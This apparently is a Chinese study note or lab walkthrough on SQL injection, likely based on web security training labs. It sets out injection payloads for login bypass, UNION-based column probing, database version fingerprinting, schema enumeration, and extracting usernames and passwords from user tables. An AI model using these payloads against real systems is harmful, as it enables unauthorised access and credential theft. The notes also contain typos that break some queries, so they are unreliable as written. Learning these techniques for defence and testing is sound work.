1.如何检测SQL注入漏洞
	如:
	(1)单句引号`'`
	(2)经典mysql绕过登录
		`1' OR 1=1 #`
	(3)布尔环境等OR 1=1而且OR 1=2并查找应用程序响应中的差异
	(4)用于在SQL查询中执行时触发时间延误的Payload,并查找响应所需时间的差异。
	(5)OAST有效载荷旨在SQL查询中执行时触发带外网络交互，并监控任何生成的交互
2.查询的不同部分注入SQL
	大多数存在WHERE a 条款SELECT查询。产生SQL注入的其他一些常见位置包括:
		在UPDTE在更新值或WHERE条款
		在INSERT在插入的值内的语句
		在SELECT表中的语句或列表
		在SELECT声明，在ORDER BY条款
3.SQL注入条款
	示例：
		检索隐藏数据，在修改SQL查询已返回额外结果
		颠覆应用程序逻辑，使逻辑能够干扰应用程序的逻辑
		UNION攻击，从不同的数据库表中检索数据
		盲SQL注入，控制的查询结果不会返回到应用程序的响应中
4.获取隐藏数据
	如：
		`http://.../products?category=Gifts`
		当用户点击礼品类别时，应用程序进行SQL查询
		`SELECT * FROM products WHERE category='Gifts' AND released=1`
	如：
		该应用程序未对SQL注入攻击实施任何防御措施。可以用以下攻击，如：
			`http://.../products?category=Gifts' --`
			这在SQL查询中会导致:
			`SELECT * FROM products WHERE category='GIFTS' --' AND released=1`
			`--`是SQL中的一个评论指标。这意味着其余的查询被解释为注释，从而有效地将其删除。在此示例中，这意味着该查询不再包含AND releaed=1.因此，所有产品都会被展示，包括尚未发布的产品
	如:
		`http://.../products?category=Gift'+OR+1=1--`
		SQL查询会导致:
			`SELECT * FROM products WHERE category='GIFTS' OR 1=1-- ' AND released=1`
		修改后的查询会返回所有项目category是Gifts或者1等等1.如1=1始终为真，查询查看源码会发现/filter?category这个头，这里有gifts,后面就在上面URL栏试试/filter?category=Gifts发现里面是有隐藏的东西.
5.颠覆性应用逻辑
	如：一个允许用户使用用户名和密码登录的应用程序，用户提交username=wiener和password=bluecheese
	应用程序以下查询：
		`SELECT * FROM users WHERE username='wiener' AND password='bluecheese'`
	如果以上用户被拒绝，攻击者可以任何用户身份登录。而无需使用密码。以上可以使用SQL注释程序到`--`删除密码检查WHERE查询的子句
		如:administrator' -- +空密码
		会执行
			`SELECT * FROM users WHERE username='administrator' --' AND password=''`
6.UNION攻击
	(1)从其他数据表中获取数据
		应用程序响应SQL查询结果的情况下，可以使用UNION执行附加功能的关键词SELECT查询结果并附加到原始查询中。
			如：一个应用程序执行以下包含用户输入的查询Gifts:
			`SELECT name,description FROM products WHERE category='Gifts'`
			攻击者可以提交输入:
			`' UNION SELECT username,password FROM user--`
			这会导致应用程序将所有用户名和密码以及产品名称和描述都归还
			如：执行一个或多个附加功能SELECT查询并将结果附加到原始查询中:如
			`SELECT a,b FROM table1 UNION SELECT c,d FROM table2`
			此SQL查询返回一个包含两列的结果集，其中包含列中的值a而且b在table1和列c而且d在table2
		为UNION需要查询才能工作，必须满足两个条件：
			1)单个查询必须返回相同数量的列
			2)每列中的数据类型必须在单个查询之间具有兼容性
		要执行SQL注入UNION攻击，请确保您的攻击符合这两个要求。这通常包括找出:
			1)从原始查询中返回了多少列
			2)原始查询中返回的列是用于保存注入查询结果的合适数据类型
	(2)确定所需列数
		方法一:注入一系列ORDER BY将指定的列索引递增至出现错误。
			如:提交
				`1 ORDER BY 1--`
				`1 ORDER BY 2--`
				`1 ORDER BY 3--`
				`etc .`  超过实际列数时，会返回错误
		方法二:提交一系列`UNION SELECT`指定不同数量的空值的有效载荷：
			`' UNION SELECT UNLL--`
			`' UNION SELECT NULL,NULL--`
			`' UNION SELECT NULL,NULL,NULL--`
			`etc . `  空数与列数不匹配，会返回错误
	(3)数据库专用语法
		在Oracle上，每一个SELECT查询必须使用FROM关键字并指定一个有效的表。Oracle上有一个内置的表格dual可用于此目的。因此，对Oracle的注入查询需要如下所示:
			`' UNION SELECT NULl FROM DUAL--`更多看SQL注入式作弊表
	(4)使用有用的数据类型查找列
		确定所需列的数量后，可以对每列进行探查，以测试其是否能保存字符串数据。可以提交一系列UNION SELECT将字符串值依次放入每列的有效载荷。例如，如果查询返回四列，提交：
			`' UNION SELECT 'a',NULL,NULL,NULL--`
			`' UNION SElECT NULL,'a',NULL,NULL--`
			`' UNION SELECT NULL,NULL,'a',NULL--`
			`' UNION SELECT NULL,NULL,NULL,'a'--`
	(5)获取有趣的数据
		如假设原始查询返回两列，两列都可以保存字符，注入点是其中引用的字符串WHERE条款数据库名包含一个名为users列username且列password
		示例，`UNION SELECT username,password FROM users--`
		与`4.`一样要先看源代码
	(6)在单列中检索多个值
		可以通过将值连接在一起，在此单列中间时检索多个值。可以包含一个分隔符，以区分组合值
			如在Oracle甲骨文上，可以提交
			`' UNION SELECT username || '~' || password FROM users--`
		这使用了双管系列`||`Oracle上的字符串连接运算符，注入的查询将该值组合在一起username而且password字段，由以下部分分隔~连着
			如：查询结果:
			`administrator~s3cure`
			`wiener~peter`
			...
		步骤：先找列数，再找哪列可保存字符串，再检索值
			如:
				`/filter?category=Gifts'+UNION+SELECT+NULL,'a'--`知道第二列可以保存字符串
				`/filter?category=Gifts'+UNION+SELECT+NULL,'a'--`知道第二列可以保存字符串
				`/filter?category=Gift'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--`
7.检查数据库
	要利用SQL注入漏洞，通常许需要查找有关数据库的信息，包括:
		1)数据库软件的类型和版本
		2)数据库包含的表格和列
	(1)

| 数据库类型           | 查询                      |
| --------------- | ----------------------- |
| Microsoft,MySQL | SELECT @@version        |
| Oracle          | SELECT * FROM v$version |
| PostgreSQL      | SELECT version()        |
		如:`' UNION SELECT @@versin--`
		Oracle需要带FROM dual
		如:
			`/filter?category=Gifts'+UNION+SELECT+NULL,NULL+FROM+dual--`知道有两列
			`/filter?category=Gifts'+UNION+SELECT+'a','a'+FROM+dual--`知道二列可以保存字符串
			`/filter?......+NULL,NULL+FROM+V$version--`
		如：第二题`--`换成`#`在URL栏中要写成`%23`在Burp中可以不换
			`/filter?category=Gifts'+UNION+SELECT+NULL,NULL#(%23)`知道有两列
			`/filter?category=Gifts'+UNION+SELECT+@@version,NULL#(%23)`
	(2)列出数据库的内容
		如：可以查询information_schema.tables列出数据库中的表格
			`SELECT * FROM information_schema.tables`
			然后可以查询`information_schema.columns`列出单个表格中的列:
			`SELECT * FROM information_schema.comlumns WHERE table_name='Users'`
			如`/filter?category=Gifts'+UNION+SELECT+NULL,NULL--`知道有两列
			`/filter?category=Gifts'+UNION+SELECT+table_name,+UNLL+FROM+information_schema.tables--`来检索数据库中的表列表-->爆出所有表名
			`/filter?category=Gifts'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='pg_user'--`(其中里面的pg_user可以或pg_user_manging)-->列出pg_user等等表里的列名
			如：pg_user的列有username、passwd
			`/filter?category=Gifts'+UNION+SELECT+username,passwd+FROM+pg_user--`后面再用查到的账号密码登录
	(3)列出Oracle数据库的内容
		可以通过查询来列出表格all_tables:
			`SELECT * FROM all_tables`
		可以通过查询列出列all_tab_columns：
			`SELECT * FROM all_tab_columns WHERE table_name='USERS'`
		如:
			`/filter?category=Gifts'UNION+SELECT+NULL,NULL FROM+dual--`看有多少列
			`/filter?category=Gifts'UNION+SELECT+table_name,+NULL+FROM+all_tables--` 爆出有多少表
			`/filter?category=Gifts'UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_MQEJTQ'--`  爆出USER_MQEJTQ里面的列
			`/filter?category=Gifts'UNION+SELECT+USERNAME_NIUDUU,PASSWORD_DMYAIT+FROM+USERS_MQEJTQ`  爆出登录用户和密码
